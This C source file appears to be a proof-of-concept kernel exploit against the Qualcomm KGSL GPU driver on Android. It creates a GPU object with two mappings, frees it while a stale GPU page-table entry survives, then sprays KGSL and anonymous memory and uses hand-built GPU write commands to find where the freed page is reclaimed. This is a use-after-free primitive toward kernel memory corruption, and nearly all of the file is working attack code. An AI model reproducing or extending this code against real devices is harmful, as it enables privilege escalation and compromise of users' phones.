/* kgsl-reclaim.c — drain the KGSL page pool with a CORRECTED (paired+waited)
 * CP submit and find where E's freed page goes.
 *
 *  - double-region E (G1 via mmap#1, G2 via mmap#2 after mremap-shrink)
 *  - free E, munmap both -> only G2 unmapped; G1 stale PTE remains
 *  - phase 1: allocate NF 4 KiB SVM entries, then ONE IB [write G1=MAGIC,
 *    write marker], poll marker, scan every entry's CPU page for MAGIC.
 *  - phase 2 (if no hit): large anonymous-memory spray, probe G1 again.
 *
 * The single paired submit avoids the async command-buffer reuse artifact that
 * invalidated the earlier drain.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define DEV "/dev/kgsl-3d0"
#define USE_CPU_MAP 0x10000000ULL
#define MAGIC  0xC0FFEE42u
#define MAGIC2 0xDEAD10CCu
#define NF     8192

struct kgsl_gpumem_alloc_id { unsigned int id, flags; size_t size, mmapsize; unsigned long gpuaddr; unsigned long __pad[2]; };
struct kgsl_gpuobj_alloc { uint64_t size, flags, va_len, mmapsize; unsigned int id, metadata_len; uint64_t metadata; };
struct kgsl_gpuobj_free  { unsigned int id, flags; uint64_t offset, len; };
struct kgsl_gpuobj_info  { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
struct kgsl_drawctxt_create { unsigned int flags, drawctxt_id; };
struct kgsl_drawctxt_destroy { unsigned int drawctxt_id; };
struct kgsl_command_object { uint64_t offset, gpuaddr, size; unsigned int flags, id; };
struct kgsl_gpu_command { uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs; uint64_t synclist; unsigned int syncsize, numsyncs, context_id, timestamp; };
#define IOCTL_CTXT_CREATE   _IOWR(KGSL_IOC_TYPE,0x13,struct kgsl_drawctxt_create)
#define IOCTL_CTXT_DESTROY  _IOW (KGSL_IOC_TYPE,0x14,struct kgsl_drawctxt_destroy)
#define IOCTL_PMEM_ALLOC_ID _IOWR(KGSL_IOC_TYPE,0x34,struct kgsl_gpumem_alloc_id)
#define IOCTL_GPUOBJ_ALLOC  _IOWR(KGSL_IOC_TYPE,0x45,struct kgsl_gpuobj_alloc)
#define IOCTL_GPUOBJ_FREE   _IOW (KGSL_IOC_TYPE,0x46,struct kgsl_gpuobj_free)
#define IOCTL_GPUOBJ_INFO   _IOWR(KGSL_IOC_TYPE,0x47,struct kgsl_gpuobj_info)
#define IOCTL_GPU_COMMAND   _IOWR(KGSL_IOC_TYPE,0x4A,struct kgsl_gpu_command)
#define KGSL_CONTEXT_PREAMBLE 0x10
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x2
#define KGSL_CMDBATCH_MEMLIST 0x1
#define KGSL_CMDLIST_IB 0x1
#define KGSL_OBJLIST_MEMOBJ 0x8
#define CP_MEM_WRITE 0x3d

static int fd; static uint32_t *cmd,*mark; static uint64_t cgpu,mgpu; static unsigned cid,ctx;
static void on_alarm(int s){ (void)s; write(1,"[!] alarm\n",10); _exit(0x42); }
static unsigned int parity(unsigned int v){ v^=v>>16; v^=v>>8; v^=v>>4; v&=0xf; return (0x9669u>>v)&1; }
static unsigned int t7(unsigned int op,unsigned int cnt){ cnt&=0x3fff;op&=0x7f; return (7u<<28)|cnt|(parity(cnt)<<15)|(op<<16)|(parity(op)<<23); }
static unsigned int *put_addr(unsigned int *p,uint64_t a){ *p++=(unsigned)a; *p++=(unsigned)(a>>32); return p; }
/* one IB [write saddr=sval, write marker=mval]; return marker value */
static uint32_t submit_pair(uint64_t saddr,uint32_t sval,uint32_t mval){
    mark[0]=0;
    uint32_t *p=cmd; memset(cmd,0,0x40);
    *p++=t7(CP_MEM_WRITE,3); p=put_addr(p,saddr); *p++=sval;
    *p++=t7(CP_MEM_WRITE,3); p=put_addr(p,mgpu);  *p++=mval;
    struct kgsl_command_object cob; memset(&cob,0,sizeof cob);
    cob.gpuaddr=cgpu; cob.size=(uint64_t)(p-cmd)*4; cob.flags=KGSL_CMDLIST_IB;
    struct kgsl_command_object mo; memset(&mo,0,sizeof mo);
    mo.gpuaddr=cgpu; mo.size=0x10000; mo.flags=KGSL_OBJLIST_MEMOBJ; mo.id=cid;
    struct kgsl_gpu_command gc; memset(&gc,0,sizeof gc);
    gc.flags=KGSL_CMDBATCH_MEMLIST; gc.context_id=ctx;
    gc.cmdlist=(uint64_t)(uintptr_t)&cob; gc.cmdsize=sizeof cob; gc.numcmds=1;
    gc.objlist=(uint64_t)(uintptr_t)&mo; gc.objsize=sizeof mo; gc.numobjs=1;
    ioctl(fd,IOCTL_GPU_COMMAND,&gc);
    for(int t=0;t<250;t++){ if(mark[0]==mval) break; usleep(2000); }
    return mark[0];
}
int main(void){
    setvbuf(stdout,NULL,_IONBF,0); signal(SIGALRM,on_alarm); alarm(240);
    printf("== kgsl reclaim (corrected paired submit) uid=%d NF=%d ==\n",(int)getuid(),NF);
    fd=open(DEV,O_RDWR); if(fd<0){ printf("[-] open: %s\n",strerror(errno)); return 1; }
    struct kgsl_gpumem_alloc_id ca; memset(&ca,0,sizeof ca); ca.size=0x10000;
    ioctl(fd,IOCTL_PMEM_ALLOC_ID,&ca); cid=ca.id; cgpu=ca.gpuaddr;
    cmd=mmap(NULL,0x10000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)cid<<12); memset(cmd,0,0x10000);
    struct kgsl_gpumem_alloc_id ma; memset(&ma,0,sizeof ma); ma.size=0x1000;
    ioctl(fd,IOCTL_PMEM_ALLOC_ID,&ma); mgpu=ma.gpuaddr;
    mark=mmap(NULL,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)ma.id<<12);
    struct kgsl_drawctxt_create cc; memset(&cc,0,sizeof cc);
    cc.flags=KGSL_CONTEXT_PREAMBLE|KGSL_CONTEXT_NO_GMEM_ALLOC;
    ioctl(fd,IOCTL_CTXT_CREATE,&cc); ctx=cc.drawctxt_id;

    /* double-region E */
    struct kgsl_gpuobj_alloc sa; memset(&sa,0,sizeof sa);
    sa.size=0x2000; sa.flags=USE_CPU_MAP; sa.va_len=0x2000;
    if(ioctl(fd,IOCTL_GPUOBJ_ALLOC,&sa)<0){ printf("[-] svm alloc: %s\n",strerror(errno)); return 1; }
    struct kgsl_gpuobj_info si; memset(&si,0,sizeof si); si.id=sa.id;
    void *v1=mmap(NULL,0x2000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)sa.id<<12);
    ioctl(fd,IOCTL_GPUOBJ_INFO,&si); uint64_t G1=si.gpuaddr;
    void *m=mremap(v1,0x2000,0x1000,0); if(m!=MAP_FAILED) v1=m;
    ioctl(fd,IOCTL_GPUOBJ_INFO,&si);
    void *v2=mmap(NULL,0x2000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)sa.id<<12);
    ioctl(fd,IOCTL_GPUOBJ_INFO,&si); uint64_t G2=si.gpuaddr;
    printf("[1] E=%u G1=0x%llx G2=0x%llx\n",sa.id,(unsigned long long)G1,(unsigned long long)G2);
    printf("    sanity G2 write mark=0x%08x (want 0x5A01)\n", submit_pair(G2,0x5A5A0001u,0x5A01u));

    { struct kgsl_gpuobj_free f; memset(&f,0,sizeof f); f.id=sa.id; ioctl(fd,IOCTL_GPUOBJ_FREE,&f); }
    munmap(v2,0x2000); munmap(v1,0x1000);
    { struct kgsl_gpuobj_info chk; errno=0; int rr=ioctl(fd,IOCTL_GPUOBJ_INFO,&chk);
      printf("[2] E freed (INFO rc=%d errno=%d)\n",rr,errno); }

    /* phase 1: kgsl 4 KiB drain */
    static void *fm[NF]; long n=0;
    for(long i=0;i<NF;i++){
        struct kgsl_gpuobj_alloc fa; memset(&fa,0,sizeof fa);
        fa.size=0x1000; fa.flags=USE_CPU_MAP; fa.va_len=0x1000;
        if(ioctl(fd,IOCTL_GPUOBJ_ALLOC,&fa)<0){ printf("[!] alloc %ld: %s\n",i,strerror(errno)); break; }
        void *p=mmap(NULL,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)fa.id<<12);
        if(p==MAP_FAILED){ printf("[!] mmap %ld: %s\n",i,strerror(errno)); break; }
        fm[i]=p; n++;
    }
    printf("[3] phase1: allocated %ld x 4 KiB; one paired G1 write\n",n);
    uint32_t mk=submit_pair(G1,MAGIC,0x5A02u);
    long hit=-1;
    for(long i=0;i<n;i++) if(*(volatile uint32_t*)fm[i]==MAGIC){ hit=i; break; }
    printf("    marker=0x%08x  hit index=%ld %s\n",mk,hit,hit>=0?"<<< RECLAIMED":"(none)");

    /* phase 2: anonymous spray (buddy/PCP path) */
    if(hit<0){
        size_t ANON=(size_t)256<<20;   /* 256 MiB */
        char *a=mmap(NULL,ANON,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
        if(a==MAP_FAILED){ printf("[!] anon mmap: %s\n",strerror(errno)); }
        else {
            for(size_t o=0;o<ANON;o+=0x1000) a[o]=0;
            printf("[4] phase2: anon spray %zu MiB; paired G1 write\n",ANON>>20);
            uint32_t mk2=submit_pair(G1,MAGIC2,0x5A03u);
            long ahit=-1;
            for(size_t o=0;o<ANON;o+=0x1000) if(*(volatile uint32_t*)(a+o)==MAGIC2){ ahit=(long)(o>>12); break; }
            printf("    marker=0x%08x  anon page=%ld %s\n",mk2,ahit,ahit>=0?"<<< RECLAIMED":"(none)");
        }
    }
    { struct kgsl_drawctxt_destroy x={ctx}; ioctl(fd,IOCTL_CTXT_DESTROY,&x); }
    printf("== done ==\n"); return 0;
}
